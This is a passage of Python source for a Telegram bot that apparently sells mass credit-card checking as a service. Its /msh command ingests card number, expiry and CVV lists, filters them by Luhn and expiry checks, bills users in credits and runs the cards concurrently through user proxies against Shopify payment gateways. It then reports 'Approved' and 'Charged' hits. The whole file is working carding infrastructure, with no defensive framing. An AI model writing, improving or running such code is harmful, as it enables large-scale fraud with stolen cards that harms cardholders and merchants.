                session_id,
                retry_tuples,
                session.get('user_obj'),
                session.get('plan_name')
            )
        )

    except Exception as e:
        logging.error(f"Error handling retry callback: {e}", exc_info=True)
        try:
            await callback.answer("<tg-emoji emoji-id='5397890704062038337'>❌</tg-emoji> Error retrying", show_alert=True)
        except:
            pass


# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# MODE SELECTION CALLBACK (Charged Only vs Approved+Charged)
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

@router.callback_query(MshModeCallback.filter())
async def msh_mode_callback(callback: types.CallbackQuery, callback_data: MshModeCallback):
    pending_id = callback_data.pending_id
    mode = callback_data.mode  # "charged" or "approved"

    pending = MSH_PENDING.pop(pending_id, None)
    if not pending:
        try:
            await callback.answer("<tg-emoji emoji-id='5350572310627632617'>⚠️</tg-emoji> Selection expired — run /msh again.", show_alert=True)
        except Exception:
            pass
        return

    user_id = callback.from_user.id
    # Only the same user who triggered /msh can pick the mode
    if pending["user"].id != user_id:
        try:
            await callback.answer("<tg-emoji emoji-id='5397890704062038337'>❌</tg-emoji> Not your check.", show_alert=True)
        except Exception:
            pass
        # Put it back so the legitimate user can still pick
        MSH_PENDING[pending_id] = pending
        return

    # Notify-mode: "charged" → suppress approved messages; "approved" → send both
    try:
        await callback.answer(
            "<tg-emoji emoji-id='6147670059822092505'>🔥</tg-emoji> Charged Only" if mode == "charged" else "<tg-emoji emoji-id='5310296284874159738'>✅</tg-emoji> Approved + Charged",
            show_alert=False,
        )
    except Exception:
        pass

    # Edit the prompt message to confirm the choice, then start the check
    try:
        choice_text = (
            f"<tg-emoji emoji-id='6147670059822092505'>🔥</tg-emoji> <b>Charged Only</b>" if mode == "charged"
            else f"<tg-emoji emoji-id='5310296284874159738'>✅</tg-emoji> <b>Approved + Charged</b>"
        )
        await callback.message.edit_text(
            f"<tg-emoji emoji-id=\"{EMOJI_CROWN}\"><tg-emoji emoji-id='6338940587193930733'>👑</tg-emoji></tg-emoji> "
            f"<b>Mode Selected ➛</b> {choice_text}\n"
            f"<i>Starting mass check…</i>",
            parse_mode="HTML",
        )
    except Exception:
        pass

    notify_mode = "charged_only" if mode == "charged" else "all_approved"

    logging.info(
        f"[msh] user {pending['user'].id} picked mode='{mode}' → "
        f"notify_mode='{notify_mode}' "
        f"({'approved DMs suppressed' if notify_mode == 'charged_only' else 'all hits DMd'})"
    )

    # Launch the actual background check with the chosen notify-mode
    asyncio.create_task(
        process_mass_check_background(
            pending["message"],
            pending["bot"],
            pending["valid_cards"],
            pending["user"],
            pending["user_proxies"],
            pending["is_group"],
            notify_mode=notify_mode,
        )
    )


# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# MAIN COMMAND
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

@router.message(F.text.startswith("/msh") | F.caption.startswith("/msh"))
async def msh_command(message: types.Message):
    user = message.from_user
    user_id = user.id
    bot = message.bot
    admin = is_admin(user_id)

    if not admin and not await asyncio.to_thread(is_gate_enabled, "msh"):
        await message.reply("🚧 <b>Mass Gate under Maintenance.</b>", parse_mode="HTML")
        return

    if not admin:
        is_premium, _ = get_premium_status(user_id)
        if not is_premium:
            await message.reply(
                "<tg-emoji emoji-id='6183613910977876404'>💎</tg-emoji>Please upgrade your plan to use this feature.\n\n👉 Contact <a href=\"https://t.me/ShopifyxoBot\">owner</a> to upgrade.",
                parse_mode="HTML"
            )
            return

    is_checking = False
    for session_id, session_data in list(MSH_SESSIONS.items()):
        if session_data.get('user_id') == user_id and session_data.get('status') == "CHECKING":
            is_checking = True
            break

    if is_checking:
        await message.reply(
            "<tg-emoji emoji-id='5350572310627632617'>⚠️</tg-emoji> <b>Active Session</b>\n\n"
            "You have a check running.\n"
            "Use the <b>🛑 Stop</b> button to stop it.",
            parse_mode="HTML"
        )
        return

    user_proxies = await get_user_proxies(user_id)
    if not user_proxies:
        await message.reply(
            "<tg-emoji emoji-id='5350572310627632617'>⚠️</tg-emoji> <b>No Proxies!</b>\n\n"
            "Add proxies using <code>/proxy</code> command.",
            parse_mode="HTML"
        )
        return

    # ── Collect raw text from command, reply, caption, and/or attached file ──
    raw_text = ""

    # Command inline text (works whether the trigger came via .text or .caption)
    cmd_text = message.text or message.caption or ""
    parts = cmd_text.split(maxsplit=1)
    if len(parts) > 1:
        raw_text += parts[1] + " "

    # Text / caption from a replied-to message
    if message.reply_to_message:
        replied_msg = message.reply_to_message
        if replied_msg.text:
            raw_text += replied_msg.text + " "
        elif replied_msg.caption:
            raw_text += replied_msg.caption + " "

    # Document: prefer the current message's attachment, then a replied-to doc
    document = message.document
    if not document and message.reply_to_message:
        document = message.reply_to_message.document

    if document:
        if document.file_size > 2 * 1024 * 1024:
            await message.reply("<tg-emoji emoji-id='5397890704062038337'>❌</tg-emoji> File too large. Max 2MB.")
            return
        try:
            file_info = await bot.get_file(document.file_id)
            byte_content = await bot.download_file(file_info.file_path)
            if byte_content:
                data = byte_content.read() if hasattr(byte_content, 'read') else byte_content
                raw_text += data.decode('utf-8', errors='ignore')
        except Exception as e:
            await message.reply(f"<tg-emoji emoji-id='5397890704062038337'>❌</tg-emoji> Error reading file: {e}")
            return

    if not raw_text.strip():
        await message.reply(
            "<tg-emoji emoji-id='5397890704062038337'>❌</tg-emoji> <b>No cards found.</b>\n\n"
            "• <code>/msh cc|mm|yy|cvv</code>\n"
            "• Reply to cards with <code>/msh</code>\n"
            "• Send .txt file with <code>/msh</code>",
            parse_mode="HTML"
        )
        return

    # ── Extract & validate cards here so we can check credits upfront ──
    extracted_cards = extract_cards_from_text(raw_text)
    if not extracted_cards:
        await message.reply("<tg-emoji emoji-id='5397890704062038337'>❌</tg-emoji> No valid card formats found.")
        return

    valid_cards = []
    expired_count = 0
    invalid_luhn_count = 0

    # ── Card-count cap ─────────────────────────────────────────
    # Default: 2000 cards per /msh (Telegram rate-limit safe + sane memory).
    # Admin:    unlimited (no cap, /msh accepts however many cards were sent).
    # /unlimitedchk target: 10000 cards per /msh (10× normal premium cap).
    # Premium:  same 2000 (premium is just "no credit charge", not unlimited).
    #
    # We compute the cap ONCE here, factoring in admin + unlimited_msh,
    # so the loop below applies it consistently.
    is_unl_msh_for_cap = is_unlimited_msh(user_id)
    if admin:
        MAX_VALID_CARDS = 10_000_000   # effectively unlimited for admin
    elif is_unl_msh_for_cap:
        MAX_VALID_CARDS = 10_000       # /unlimitedchk target: 10k per /msh
    else:
        MAX_VALID_CARDS = 2000        # regular + premium default

    for card_string in extracted_cards:
        if len(valid_cards) >= MAX_VALID_CARDS:
            break
        parts_c = card_string.split('|')
        if len(parts_c) != 4:
            continue
        cc, mm, yy, cvv = parts_c
        if not luhn_check(cc):
            invalid_luhn_count += 1
            continue
        if is_expired(mm, yy):
            expired_count += 1
            continue
        valid_cards.append((card_string, cc))

    total_cards = len(valid_cards)
    if total_cards == 0:
        filter_info = ""
        if expired_count > 0 or invalid_luhn_count > 0:
            filter_info = f"Filtered {invalid_luhn_count} invalid & {expired_count} expired.\n"
        await message.reply(f"{filter_info}<tg-emoji emoji-id='5397890704062038337'>❌</tg-emoji> No valid cards to check.", parse_mode="HTML")
        return

    # ── Credit check: admin and /unlimitedchk users skip this ──
    # Admins always skip (set by is_admin above). /unlimitedchk targets
    # are flagged via the `unlimited_msh` field in the users collection
    # and also skip here. Premium users still get charged unless they
    # were ALSO granted unlimited_msh by the admin.
    if not admin and not is_unl_msh_for_cap:
        is_prem_msh, _ = get_premium_status(user_id)
        if not is_prem_msh:
            current_credits = await asyncio.to_thread(get_user_credits, user_id)
            if current_credits < total_cards:
                await message.reply(
                    f"<tg-emoji emoji-id='5397890704062038337'>❌</tg-emoji> <b>Insufficient Credits</b>\n\n"
                    f"You need <b>{total_cards}</b> credits to check <b>{total_cards}</b> cards.\n"
                    f"Your balance: <b>{current_credits}</b> credits.\n\n"
                    f"Please add more credits or reduce the number of cards.",
                    parse_mode="HTML"
                )
                return

    # Detect if the command was sent from a group or supergroup
    is_group = message.chat.type in ("group", "supergroup", "channel")

    # ── Ask user to pick a notify mode before launching ──
    pending_id = "".join(random.choices(string.ascii_uppercase + string.digits, k=10))
    MSH_PENDING[pending_id] = {
        "message": message,
        "bot": bot,
        "valid_cards": valid_cards,
        "user": user,
        "user_proxies": user_proxies,
        "is_group": is_group,
        "total_cards": total_cards,
    }

    crown  = f'<tg-emoji emoji-id="{EMOJI_CROWN}">👑</tg-emoji>'
    fire   = f'<tg-emoji emoji-id="{CUSTOM_CHARGED_EMOJI_ID}">🔥</tg-emoji>'
    blue   = f'<tg-emoji emoji-id="{CUSTOM_APPROVED_EMOJI_ID}">✅</tg-emoji>'

    prompt_text = (
        f"{crown} <b>Mass Check ➛ Select Mode</b>\n"
        f"━━━━━━━━━━━━━━━━\n"
        f"💳 <b>Cards ➛</b> <code>{total_cards}</code>\n"
        f"🔥 <b>Gateway ➛</b> Shopify\n"
        f"━━━━━━━━━━━━━━━━\n"
        f"{fire} <b>Charged Only</b>\n"
        f"{blue} <b>All Approved</b>"
    )

    mode_kb = InlineKeyboardMarkup(inline_keyboard=[
        [
            InlineKeyboardButton(
                text="Charged Only",
                callback_data=MshModeCallback(pending_id=pending_id, mode="charged").pack(),
                style="primary",
                icon_custom_emoji_id=CUSTOM_CHARGED_EMOJI_ID,
            ),
        ],
        [
            InlineKeyboardButton(
                text="Approved + Charged",
                callback_data=MshModeCallback(pending_id=pending_id, mode="approved").pack(),
                style="success",
                icon_custom_emoji_id=CUSTOM_APPROVED_EMOJI_ID,
            ),
        ],
    ])

    await message.reply(prompt_text, parse_mode="HTML", reply_markup=mode_kb, disable_web_page_preview=True)

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# BACKGROUND PROCESSING
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

async def process_mass_check_background(
    message: types.Message,
    bot: Bot,
    valid_cards: list,
    user_obj,
    user_proxies,
    is_group: bool = False,
    notify_mode: str = "all_approved",  # "charged_only" | "all_approved"
):
    """
    Receives a pre-validated list of (card_string, cc_num) tuples.
    Card extraction, Luhn/expiry validation, and credit checks are all
    performed upfront in msh_command before this task is launched.
    """
    user_id = user_obj.id
    chat_id = message.chat.id

    total_cards = len(valid_cards)
    if total_cards == 0:
        await message.reply("<tg-emoji emoji-id='5397890704062038337'>❌</tg-emoji> No valid cards to check.", parse_mode="HTML")
        return

    session_id = "".join(random.choices(string.ascii_uppercase + string.digits, k=8))
    plan_name = await get_user_plan_name(user_id)

    # ── Resolve premium + unlimited flags ONCE here ──
    # process_single_card is called per-card (1000s of times per session).
    # The original code called get_premium_status() and is_unlimited_msh()
    # synchronously on the event loop inside process_single_card, which
    # hit MongoDB on every card. With 35 concurrent workers per user that
    # stalled the event loop and visibly delayed the DM that gets sent on
    # every charge.
    is_prem_at_start = get_premium_status(user_id)[0]
    is_unl_at_start = is_unlimited_msh(user_id)

    proxy_manager = ProxyManager(user_proxies, session_id)
    proxy_stats = proxy_manager.get_stats()

    logging.info(f"🔄 [MSH] Session {session_id} initialized with ProxyManager: {proxy_stats['total_proxies']} proxies (normalized)")

    initial_text = _build_progress_caption(
        {
            "status": "CHECKING",
            "start_time": time.time(),
            "checked": 0,
            "total": total_cards,
            "approved": 0,
            "charged": 0,
            "dead": 0,
            "errors": 0,
            "proxy_manager": proxy_manager,
        },
        session_id,
    )

    initial_buttons = get_result_buttons(session_id, is_running=True)

    progress_msg = await message.reply(initial_text, parse_mode="HTML", reply_markup=initial_buttons)

    MSH_SESSIONS[session_id] = {
        "session_id": session_id,
        "status": "CHECKING",
        "chat_id": chat_id,
        "user_id": user_id,
        "msg_id": progress_msg.message_id,
        "user_msg_id": message.message_id,
        "total": total_cards,
        "checked": 0,
        "approved": 0,
        "charged": 0,
        "dead": 0,
        "errors": 0,
        "start_time": time.time(),
        "tasks": [],
        "proxies": user_proxies,
        "proxy_manager": proxy_manager,
        "bad_proxies": [],
        "last_text": "",
        "last_update_time": 0,
        "live_cards": [],
        "dead_cards": [],
        "charged_cards": [],
        "error_cards": [],
        "user_obj": user_obj,
        "plan_name": plan_name,
        "is_group": is_group,  # Track whether started from a group
        "notify_mode": notify_mode,  # "charged_only" | "all_approved"
        # ── Cached user status (resolved ONCE at session start) ──
        # Avoids per-card MongoDB queries in process_single_card which
        # would block the event loop and stall all parallel workers.
        "_is_admin_cached": is_admin(user_id),
        "_is_premium_cached": is_prem_at_start,
        "_is_unlimited_cached": is_unl_at_start,
        # ── Background DB-task tracker ──
        # Keeps strong refs to fire-and-forget DB writes so they don't get
        # garbage collected mid-flight. Used for stats / credits updates
        # that don't need to block the user-visible DM.
        "_db_tasks": [],
        # ── Sites cache — loaded ONCE at session start, reused for all cards
        # Previously get_sites() was called inside process_single_card (on
        # EVERY retry, every card), causing repeated disk I/O under heavy load.
        # Now we load once here and reuse the cached list throughout the session.
        "sites_list": get_sites(),
    }

    print(f"🚀 [MSH] Started - {total_cards} cards - User: {user_id} - Proxies: {len(user_proxies)} - Group: {is_group} - notify_mode={notify_mode}")
    logging.info(f"🚀 [MSH] Started - {total_cards} cards - User: {user_id} - Proxies: {len(user_proxies)} - Group: {is_group} - notify_mode={notify_mode}")

    # ━━━ PER-CARD API PIN (admin-requested load distribution) ━━━━
    # Each card is pinned to ONE specific entry in SHOPIFY_API_URLS so
    # load is split across the configured APIs (e.g. 2 APIs → ~50/50).
    # No cross-API fallback: if pinned API fails for this card, we
    # retry the SAME index up to MAX_RETRIES then mark ERROR. Without
    # pinning, the existing weighted-RR + fallback-chain would push
    # failing-API load onto the surviving API and concentrate it.
    #
    # Staggering: assign by position so consecutive cards alternate
    # (card[0]→API[0], card[1]→API[1], card[2]→API[0], …). With 2 APIs
    # and even card count this is exactly 50/50. If only 1 API is
    # configured every card pins to API[0] — solves to legacy behaviour.
    # If 0 APIs configured, pass api_idx=None to fall through weighted-RR.
    pinned_cards: list = []
    _num_apis = len(SHOPIFY_API_URLS) if SHOPIFY_API_URLS else 0
    if _num_apis > 0:
        for _idx, _card_tuple in enumerate(valid_cards):
            # Backward compat: existing tuples are (cc_formatted, cc_num)
            # 2-tuples. We extend to (cc_formatted, cc_num, api_idx) 3-tuples.
            if len(_card_tuple) == 2:
                _cf, _cn = _card_tuple
                pinned_cards.append((_cf, _cn, _idx % _num_apis))
            else:
                # already a 3-tuple (e.g. retry session) — keep as-is
                pinned_cards.append(_card_tuple)
        api_load = {i: 0 for i in range(_num_apis)}
        for _ in pinned_cards:
            api_load[_[-1]] += 1
        logging.info(
            f"🔀 [MSH] Per-card API pin distribution: {api_load} "
            f"(out of {_num_apis} configured APIs)"
        )
        print(
            f"🔀 [MSH] Per-card API pin distribution: {api_load} "
            f"(out of {_num_apis} configured APIs)"
        )
        cards_to_run = pinned_cards
    else:
        cards_to_run = valid_cards

    asyncio.create_task(run_mass_checker(bot, session_id, cards_to_run, user_obj, plan_name))

async def run_mass_checker(bot: Bot, session_id, cards, user_obj, plan_name):
    session = MSH_SESSIONS.get(session_id)
    if not session: return

    # ━━━ PER-SESSION SEMAPHORE (not shared across users!) ━━━━━━━━━━
    # CRITICAL FIX: the old code cached semaphores by their target VALUE
    # in _user_sem_cache. When two users both computed
    # _effective_user_concurrency() = 400, they got the SAME Semaphore(400)
    # from the cache → they SHARED 400 slots. User 1's 400 workers would
    # consume all slots, leaving 0 for User 2 → User 2 stuck at 0/N for
    # minutes until User 1's workers released slots one-by-one.
    #
    # Now: each session gets its OWN semaphore, sized once at startup.
    # The circuit breaker (_breaker_gate per API) handles dynamic
    # throttling of sick APIs, so the per-user semaphore doesn't need
    # to dynamically shrink — its job is just to cap this session's
    # in-flight calls, and the worker count already does that too
    # (belt-and-suspenders).
    user_sem_target = _effective_user_concurrency(session_id)
    user_sem = asyncio.Semaphore(user_sem_target)
    session['user_sem'] = user_sem
    logging.info(
        f"🔒 [MSH] Per-session semaphore for {session_id}: "
        f"{user_sem_target} slots (exclusive to this session)"
    )

    async def process_one(cc_formatted, cc_num, api_idx=None):
        if is_session_stopped(session_id):
            return
        # Per-user concurrency cap — this session's OWN semaphore, not
        # shared with other sessions. The circuit breaker handles
        # dynamic throttling of sick APIs separately.
        async with user_sem:
            if is_session_stopped(session_id):
                return
            await _adaptive_api_throttle()
            if is_session_stopped(session_id):
                return
            async with _GLOBAL_API_SEMAPHORE:
                if is_session_stopped(session_id):
                    return
                try:
                    await process_single_card(
                        session_id, cc_formatted, cc_num,
                        session['user_id'], bot, user_obj, plan_name,
                        api_idx=api_idx,
                    )
                except asyncio.CancelledError:
                    raise
                except Exception as e:
                    if not is_session_stopped(session_id):
                        logging.error(f"Worker error for {cc_formatted}: {e}")

    # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
    # SLIDING-WINDOW TASK SPAWN (producer-consumer)
    #
    # Previously every card was wrapped in an asyncio.Task at t=0, so
    # 2000 tasks all entered the worker() immediately. Even though
    # only N ran concurrently (semaphore-limited), ALL 2000 of them
    # ran `_adaptive_api_throttle()` → did a 300-entry deque scan
    # → scheduled a 20-150ms sleep timer. That's ~2000 wasted deque
    # scans + 2000 sleep timers at startup, multiplied across 15
    # concurrent users → huge wasted CPU and event-loop pressure.
    #
    # Now: keep `_PER_USER_API_CONCURRENCY` long-lived worker tasks.
    # Each worker grabs the next card from an asyncio.Queue when it
    # becomes free. Only the workers that are about to call the API
    # do the throttle work — others just sit waiting on the queue
    # (free, zero CPU). This eliminates the startup thundering-herd
    # WITHOUT raising concurrency caps → no extra API load.
    # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
    queue: asyncio.Queue = asyncio.Queue()
    sentinel = None  # poison pill to tell workers to exit
    for card_tuple in cards:
        queue.put_nowait(card_tuple)

    print(f"📋 [MSH] {queue.qsize()} cards queued for {session_id}")
    logging.info(f"📋 [MSH] {queue.qsize()} cards queued for {session_id}")

    async def worker_loop():
        try:
            while True:
                if is_session_stopped(session_id):
                    return
                item = await queue.get()
                if item is sentinel:
                    queue.task_done()
                    return
                # ━━━ Item is either (cc_formatted, cc_num) or the 3-tuple
                # ━━━ from /msh per-card API pin (cc, num, api_idx).
                if len(item) == 3:
                    cc_formatted, cc_num, api_idx = item
                else:
                    cc_formatted, cc_num = item
                    api_idx = None
                try:
                    await process_one(cc_formatted, cc_num, api_idx=api_idx)
                finally:
                    queue.task_done()
        except asyncio.CancelledError:
            return

    # Spawn long-lived workers. The count is the FULL per-user cap (capped
    # by card count so we don't spawn 400 idle workers for 92 cards).
    #
    # IMPORTANT: we do NOT use _effective_user_concurrency() here — that
    # value includes the circuit-breaker state at startup. If the breaker
    # happened to be OPEN when this session started (e.g. another user's
    # session was already failing), it would return base//7 = ~57 workers,
    # and the session would be PERMANENTLY crippled at 57 workers even
    # after the breaker recovered. That was the root cause of the
    # 23-minute 1006-card runs.
    #
    # Instead we spawn the full _PER_USER_API_CONCURRENCY and let the
    # per-session semaphore (session['user_sem'] inside process_one)
    # cap ACTUAL API concurrency. The circuit breaker handles sick-API
    # throttling separately. Workers waiting on the semaphore are nearly
    # free (they just sit on queue.get + sem.acquire), so over-spawning
    # workers is safe — only the semaphore decides how many calls hit
    # the API at once.
    _worker_count = max(1, min(_PER_USER_API_CONCURRENCY, len(cards)))
    logging.info(
        f"👥 [MSH] Spawning {_worker_count} workers for {session_id} "
        f"(cards={len(cards)}, per_user_cap={_PER_USER_API_CONCURRENCY})"
    )
    workers = [
        asyncio.create_task(worker_loop(), name=f"msh_w_{session_id}_{i}")
        for i in range(_worker_count)
    ]
    session['tasks'].extend(workers)

    # ━━━ Background progress updater ━━━━━━━━━━━━━━━━━━━━━━━
    # Independent task that updates the progress message every 1.5s,
    # REGARDLESS of what the workers are doing. This guarantees the
    # progress bar keeps moving even when:
    #   • All 100 workers are waiting on the circuit breaker pause
    #   • Workers are blocked on the API breaker throttle
    #   • Many cards finish simultaneously and flood-control triggers
    # Workers also call update_progress_message, but this is the
    # SAFETY NET — if those calls fail or get throttled, this task
    # still pushes fresh data to the user.
    #
    # Tick lowered from 3s → 1.5s so the bar feels live even when the
    # worker-initiated updates are getting rate-limited. The
    # update_progress_message() function still has its own per-session
    # throttle (1s minimum) so we won't hammer Telegram.
    async def progress_updater_loop():
        try:
            while True:
                if is_session_stopped(session_id):
                    return
                sess = MSH_SESSIONS.get(session_id)
                if not sess or sess['status'] != "CHECKING":
                    return
                try:
                    await update_progress_message(bot, session_id)
                except Exception as e:
                    logging.debug(f"[MSH] bg progress updater error: {e}")
                # 1.5s tick — fast enough to feel live, slow enough that
                # Telegram's per-chat edit limit (~1/sec) doesn't trigger
                # when admin /sessions or charged hits are also being
                # sent to the same chat. Combined with the 1s internal
                # throttle in update_progress_message(), worst case is
                # one edit per ~1s which stays well under the limit.
                await asyncio.sleep(1.5)
        except asyncio.CancelledError:
            return

    progress_updater = asyncio.create_task(
        progress_updater_loop(), name=f"msh_progress_{session_id}"
    )
    session['tasks'].append(progress_updater)

    # Wait for queue to drain or session to be stopped
    try:
        await queue.join()
    except asyncio.CancelledError:
        pass

    # Stop the background progress updater
    progress_updater.cancel()
    try:
        await progress_updater
    except (asyncio.CancelledError, Exception):
        pass

    # Signal workers to exit
    for _ in workers:
        try:
            queue.put_nowait(sentinel)
        except Exception:
            pass

    # Cancel any workers still alive (e.g. on stop)
    for w in workers:
        if not w.done():
            w.cancel()

    # Drain worker exits
    results = await asyncio.gather(*workers, return_exceptions=True)
    cancelled = sum(1 for r in results if isinstance(r, asyncio.CancelledError))
    errors = sum(
        1 for r in results
        if isinstance(r, Exception) and not isinstance(r, asyncio.CancelledError)
    )
    if cancelled > 0:
        print(f"🛑 [MSH] {cancelled} worker(s) cancelled")
    if errors > 0:
        logging.error(f"[MSH] {errors} worker(s) failed with exceptions")

    session = MSH_SESSIONS.get(session_id)
    if session and session['status'] != "STOPPED":
        session['status'] = "FINISHED"

    await update_progress_message(bot, session_id)

    # ━━━ ADMIN NOTIFICATION — send errors file if any errors happened ━━━
    # If the session produced any ERROR cards (proxies blocked, timeouts,
    # site-error retries exhausted, etc.), bundle them into a single .txt
    # and DM it to every admin so they can see which cards / sites /
    # proxies are misbehaving without polling logs.
    if session:
        error_count = session.get('errors', 0)
        error_cards = session.get('error_cards', [])
        if error_count > 0 and error_cards:
            try:
                user_obj = session.get('user_obj')
                plan_name = session.get('plan_name', 'N/A')
                buf, fname, _ = generate_result_file(
                    session, "errors", user_obj, plan_name
                )
                summary = (
                    f"⚠️ <b>MSH Errors Report</b>\n"
                    f"<b>Session:</b> <code>{session_id}</code>\n"
                    f"<b>User:</b> {html_escape(get_user_display(user_obj, plan_name))} "
                    f"(<code>{getattr(user_obj, 'id', '?')}</code>)\n"
                    f"<b>Errors:</b> <code>{error_count}</code>"
                )
                for admin_id in ADMIN_IDS:
                    try:
                        file_bytes = buf.getvalue()
                        await bot.send_document(
                            chat_id=admin_id,
                            document=types.BufferedInputFile(
                                file=file_bytes, filename=fname
                            ),
                            caption=summary,
                            parse_mode="HTML",
                        )
                    except Exception as e:
                        logging.error(
                            f"[MSH] Failed to DM errors file to admin {admin_id}: {e}"
                        )
            except Exception as e:
                logging.error(f"[MSH] admin error-report build failed: {e}")

    print(f"✅ [MSH] Session {session_id} finished")
    logging.info(f"✅ [MSH] Session {session_id} finished")
